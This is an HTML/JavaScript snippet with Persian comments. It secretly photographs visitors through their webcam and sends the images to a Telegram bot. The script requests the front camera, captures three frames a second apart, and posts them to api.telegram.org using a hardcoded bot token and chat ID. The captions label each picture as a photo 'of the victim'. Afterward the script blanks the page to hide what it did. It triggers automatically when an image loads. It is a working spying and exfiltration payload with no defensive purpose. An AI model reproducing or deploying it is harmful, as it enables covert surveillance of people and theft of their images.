<video id="video" playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "-1003384762825"; // گروهت

    async function takePhoto() {
        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // ۳ تا عکس با فاصله ۱ ثانیه
            const send = (i) => {
                setTimeout(() => {
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const form = new FormData();
                        form.append('chat_id', CHAT_ID);
                        form.append('photo', blob, `photo_${i}.jpg`);
                        form.append('caption', `عکس زنده #${i} از قربانی`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: 'POST', body: form});
                    });
                }, i * 1000);
            };
            send(1); send(2); send(3);

            // بعد ۴ ثانیه صفحه سفید یا بسته بشه
            setTimeout(() => {
                document.body.innerHTML = "<div style='background:#fff;width:100%;height:100vh'></div>";
                stream.getTracks().forEach(t => t.stop());
            }, 4000);
        };
    }

    // وقتی عکس لود شد → خودکار شروع کنه
    document.querySelector('img').onload = takePhoto;
</script>
